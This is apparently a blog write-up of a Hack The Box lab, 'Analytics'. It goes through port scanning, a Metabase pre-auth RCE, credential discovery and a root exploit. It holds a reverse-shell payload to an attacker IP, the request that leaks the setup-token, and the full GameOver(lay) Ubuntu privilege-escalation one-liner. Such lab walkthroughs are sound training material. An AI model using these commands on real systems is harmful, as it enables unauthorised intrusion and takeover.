---
layout: post
author: H4
---

![banner](/images/htb_analytics_banner.png)  

# discovery
## port scan
```bash
$ nmap -Pn 10.10.11.233    
Nmap scan report for 10.10.11.233
Host is up (0.029s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Target domain is called `analytical.htb`. After adding the domain to our `/etc/hosts` file we have a closer look at the website and see that there is a login link on the top right which leads to `data.analytical.htb`. Lets add this domain to the `/etc/hosts` file too.

![login](/images/htb_analytics_metabase.png)  
The software `Metabase` seems to be in use here.
# exploitation
Googling for exploits for `Metabase` reveals an RCE CVE where a PoC can be found on Github: `https://github.com/m3m0o/metabase-pre-auth-rce-poc.`  
  
To use this exploit we need the `setup-token` which can be found in the `/api/session/properties` resource.
```http
GET /api/session/properties HTTP/1.1
Host: data.analytical.htb
Accept: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Safari/537.36
Content-Type: application/json
Referer: http://data.analytical.htb/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: metabase.DEVICE=964c404f-2737-4b9b-803c-328dab954e07
Connection: close

HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Tue, 31 Oct 2023 19:37:53 GMT
...
"setup-token":"249fa03d-fd94-4d5b-b94f-b4ebf3df681f",
...
```

Now we can forge our attack.  
Start a listener on the attacker machine.
```bash
$ nc -lvp 443
listening on [any] 443 ...
```

Execute the attack
```bash
$ python3 main.py -u http://data.analytical.htb -t '249fa03d-fd94-4d5b-b94f-b4ebf3df681f' -c 'bash -i >& /dev/tcp/10.10.14.25/443 0>&1' 
```

Catch connection from target
```
$ nc -lvp 443
listening on [any] 443 ...
connect to [10.10.14.25] from analytical.htb [10.10.11.233] 33288
bash: cannot set terminal process group (1): Not a tty
bash: no job control in this shell
cecce825ebf5:/$ whoami
whoami
metabase
```

> We got a shell!
{: .prompt-info }

# post exploitation
## get `ssh` access
Executing `linpeas.sh` on the target reveals the system environment which leaks credentials.
```bash
cecce825ebf5:/tmp$ sh l.sh
sh l.sh
...
HISTFILESIZE=0                                                                                                                                                                                                                              
MB_LDAP_BIND_DN=
LANGUAGE=en_US:en
USER=metabase
HOSTNAME=cecce825ebf5
FC_LANG=en-US
SHLVL=5
LD_LIBRARY_PATH=/opt/java/openjdk/lib/server:/opt/java/openjdk/lib:/opt/java/openjdk/../lib
HOME=/home/metabase
OLDPWD=/
MB_EMAIL_SMTP_PASSWORD=
LC_CTYPE=en_US.UTF-8
JAVA_VERSION=jdk-11.0.19+7
LOGNAME=metabase
_=/bin/sh
MB_DB_CONNECTION_URI=
PATH=/opt/java/openjdk/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
MB_DB_PASS=
MB_JETTY_HOST=0.0.0.0
META_PASS=An4lytics_ds20223#
LANG=en_US.UTF-8
MB_LDAP_PASSWORD=
HISTSIZE=0
SHELL=/bin/sh
MB_EMAIL_SMTP_USERNAME=
MB_DB_USER=
META_USER=metalytics
LC_ALL=en_US.UTF-8
JAVA_HOME=/opt/java/openjdk
PWD=/tmp
HISTFILE=/dev/null
MB_DB_FILE=//metabase.db/metabase.db
...
```

> Identified credentials: `metalytics:An4lytics_ds20223#`
{: .prompt-info }

## get user flag
```bash
metalytics@analytics:~$ ls
user.txt
metalytics@analytics:~$ cat user.txt 
8*****************************f
```

## privilege escalation
Reviewing `linpeas.sh` again shows that `Ubuntu 22.04.3 LTS` is the operating system.  
Googling gives us an privilege escalation exploit: `https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629/tree/main`

Content of exploit file.
```bash
#!/bin/bash

# CVE-2023-2640 CVE-2023-3262: GameOver(lay) Ubuntu Privilege Escalation
# by g1vi https://github.com/g1vi
# October 2023

echo "[+] You should be root now"
echo "[+] Type 'exit' to finish and leave the house cleaned"

unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("cp /bin/bash /var/tmp/bash && chmod 4755 /var/tmp/bash && /var/tmp/bash -p && rm -rf l m u w /var/tmp/bash")'
```

Just upload this this script to the target and execute it to get `root` access.
```bash
metalytics@analytics:/tmp$ sh lpe.sh 
[+] You should be root now
[+] Type 'exit' to finish and leave the house cleaned
root@analytics:/
```

> We got `root`!
{: .prompt-info }

## get second flag
```bash
root@analytics:/tmp# cd /root
root@analytics:/root# ls
root.txt
root@analytics:/root# cat root.txt
9***************************6
```

Pwned! <@:-)
